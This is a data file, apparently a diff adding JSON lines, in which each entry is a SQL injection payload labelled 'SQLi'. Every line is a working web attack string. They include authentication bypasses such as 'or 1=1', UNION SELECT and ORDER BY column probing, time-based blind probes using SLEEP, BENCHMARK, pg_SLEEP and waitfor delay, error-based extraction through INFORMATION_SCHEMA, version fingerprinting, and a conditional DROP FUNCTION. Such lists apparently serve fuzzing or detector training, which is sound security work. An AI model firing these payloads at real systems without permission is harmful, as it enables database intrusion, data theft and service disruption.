+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--", "type": "SQLi"}
+{"payload": "ORDER BY 9#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--", "type": "SQLi"}
+{"payload": "RANDOMBLOB(500000000/2)", "type": "SQLi"}
+{"payload": "' or '1'='1'/*", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "type": "SQLi"}
+{"payload": "ORDER BY 17", "type": "SQLi"}
+{"payload": "ORDER BY 8#", "type": "SQLi"}
+{"payload": "or 1=1/*", "type": "SQLi"}
+{"payload": "ORDER BY 14--", "type": "SQLi"}
+{"payload": "ORDER BY 16#", "type": "SQLi"}
+{"payload": "' or 'x'='x", "type": "SQLi"}
+{"payload": "ORDER BY 22#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))", "type": "SQLi"}
+{"payload": "or pg_SLEEP(5)#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1#", "type": "SQLi"}
+{"payload": "ORDER BY 7", "type": "SQLi"}
+{"payload": "ORDER BY 19", "type": "SQLi"}
+{"payload": "ORDER BY 5", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "type": "SQLi"}
+{"payload": "ORDER BY SLEEP(5)#", "type": "SQLi"}
+{"payload": "' or username like '%", "type": "SQLi"}
+{"payload": "UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--", "type": "SQLi"}
+{"payload": "\" --", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "type": "SQLi"}
+{"payload": "' --", "type": "SQLi"}
+{"payload": "==", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "&&SLEEP(5)--", "type": "SQLi"}
+{"payload": "ORDER BY 10--", "type": "SQLi"}
+{"payload": "SLEEP(5)=\"", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "type": "SQLi"}
+{"payload": "OR 1=1#", "type": "SQLi"}
+{"payload": "OR 1=0#", "type": "SQLi"}
+{"payload": "AND 7300=7300 AND ('pKlZ'='pKlZ", "type": "SQLi"}
+{"payload": "\"", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'#", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=0", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "type": "SQLi"}
+{"payload": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),3,4--", "type": "SQLi"}
+{"payload": "ORDER BY 15--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "type": "SQLi"}
+{"payload": "\"/*", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--", "type": "SQLi"}
+{"payload": "ORDER BY 2#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#", "type": "SQLi"}
+{"payload": "&&SLEEP(5)#", "type": "SQLi"}
+{"payload": "\" or 1=1", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "type": "SQLi"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)", "type": "SQLi"}
+{"payload": "or SLEEP(5)='", "type": "SQLi"}
+{"payload": "AND 7300=7300 AND ('pKlZ'='pKlY", "type": "SQLi"}
+{"payload": "ORDER BY 31337--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#", "type": "SQLi"}
+{"payload": "\";", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--", "type": "SQLi"}
+{"payload": "or benchmark(50000000,MD5(1))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--", "type": "SQLi"}
+{"payload": "ORDER BY 16", "type": "SQLi"}
+{"payload": "\" or 0=0 –", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "type": "SQLi"}
+{"payload": "benchmark(50000000,MD5(1))--", "type": "SQLi"}
+{"payload": "%\")", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "type": "SQLi"}
+{"payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5)#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12", "type": "SQLi"}
+{"payload": "ORDER BY 19#", "type": "SQLi"}
+{"payload": "\" or \"x\"=\"x", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "type": "SQLi"}
+{"payload": "and (select substring(@@version,1,1))='X'", "type": "SQLi"}
+{"payload": "or SLEEP(5)--", "type": "SQLi"}
+{"payload": "+benchmark(3200,SHA1(1))+'", "type": "SQLi"}
+{"payload": "ORDER BY 23", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "type": "SQLi"}
+{"payload": "\" or \"\"=\"", "type": "SQLi"}
+{"payload": "or SLEEP(5)=\"", "type": "SQLi"}
+{"payload": "\" or \"1\"=\"1\"#", "type": "SQLi"}
+{"payload": "') or ('1'='1--", "type": "SQLi"}
+{"payload": "') or '1'='1'--", "type": "SQLi"}
+{"payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#", "type": "SQLi"}
+{"payload": ";", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT USER(),SLEEP(5)--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))", "type": "SQLi"}
+{"payload": "ORDER BY 29", "type": "SQLi"}
+{"payload": "pg_SLEEP(5)--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=1", "type": "SQLi"}
+{"payload": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1", "type": "SQLi"}
+{"payload": "';", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "type": "SQLi"}
+{"payload": "or 0=0 --", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "type": "SQLi"}
+{"payload": "ORDER BY 18--", "type": "SQLi"}
+{"payload": "OR 3409=3409 AND ('pytW' LIKE 'pytW", "type": "SQLi"}
+{"payload": "or pg_SLEEP(5)", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "and 1=1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "type": "SQLi"}
+{"payload": "\") or (\"1\"=\"1\"#", "type": "SQLi"}
+{"payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "type": "SQLi"}
+{"payload": "ORDER BY 12--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),3", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11", "type": "SQLi"}
+{"payload": "AND 1=1 AND '%'='", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))", "type": "SQLi"}
+{"payload": "or SLEEP(5)#", "type": "SQLi"}
+{"payload": "' or         0=0 #", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3--", "type": "SQLi"}
+{"payload": "waitfor delay '00:00:05'#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "type": "SQLi"}
+{"payload": "benchmark(50000000,MD5(1))#", "type": "SQLi"}
+{"payload": "'or'1=1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=1--", "type": "SQLi"}
+{"payload": "ORDER BY 27", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))", "type": "SQLi"}
+{"payload": "or 1=1#", "type": "SQLi"}
+{"payload": "benchmark(50000000,MD5(1))", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),4", "type": "SQLi"}
+{"payload": "%'", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "type": "SQLi"}
+{"payload": "and (select substring(@@version,1,1))='M'", "type": "SQLi"}
+{"payload": "HAVING 1=1", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "type": "SQLi"}
+{"payload": "\") or (\"a\"=\"a", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3", "type": "SQLi"}
+{"payload": "AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#", "type": "SQLi"}
+{"payload": "' or 'a'='a", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "type": "SQLi"}
+{"payload": "' –", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "') or ('a'='a", "type": "SQLi"}
+{"payload": "AND 1083=1083 AND (1427=1427", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=0#", "type": "SQLi"}
+{"payload": "+ SLEEP(10) + '", "type": "SQLi"}
+{"payload": "ORDER BY 14", "type": "SQLi"}
+{"payload": "or 0=0 –", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15", "type": "SQLi"}
+{"payload": "' UNION ALL SELECT system_user(),user();#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--", "type": "SQLi"}
+{"payload": "ORDER BY 29--", "type": "SQLi"}
+{"payload": "ORDER BY 13#", "type": "SQLi"}
+{"payload": "ORDER BY 21--", "type": "SQLi"}
+{"payload": "AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)", "type": "SQLi"}
+{"payload": "ORDER BY 13--", "type": "SQLi"}
+{"payload": "ORDER BY 28", "type": "SQLi"}
+{"payload": "and (select substring(@@version,3,1))='X'", "type": "SQLi"}
+{"payload": "ORDER BY 25", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "' AnD SLEEP(5) ANd '1", "type": "SQLi"}
+{"payload": "ORDER BY 4", "type": "SQLi"}
+{"payload": "ORDER BY SLEEP(5)--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "OR 1=0", "type": "SQLi"}
+{"payload": "'#", "type": "SQLi"}
+{"payload": "' or 1=1", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#", "type": "SQLi"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0--", "type": "SQLi"}
+{"payload": "ORDER BY 1", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15", "type": "SQLi"}
+{"payload": "') or '1'='1", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--", "type": "SQLi"}
+{"payload": "\")))", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "type": "SQLi"}
+{"payload": "OR x=x--", "type": "SQLi"}
+{"payload": "or benchmark(50000000,MD5(1))--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "type": "SQLi"}
+{"payload": "like '%'", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#", "type": "SQLi"}
+{"payload": "') or '1'='1--", "type": "SQLi"}
+{"payload": "\" #", "type": "SQLi"}
+{"payload": "'--", "type": "SQLi"}
+{"payload": "AnD SLEEP(5)--", "type": "SQLi"}
+{"payload": "%' or '0'='0", "type": "SQLi"}
+{"payload": "&&SLEEP(5)", "type": "SQLi"}
+{"payload": "\") or \"1\"=\"1", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7", "type": "SQLi"}
+{"payload": "' or 0=0 –", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8#", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#", "type": "SQLi"}
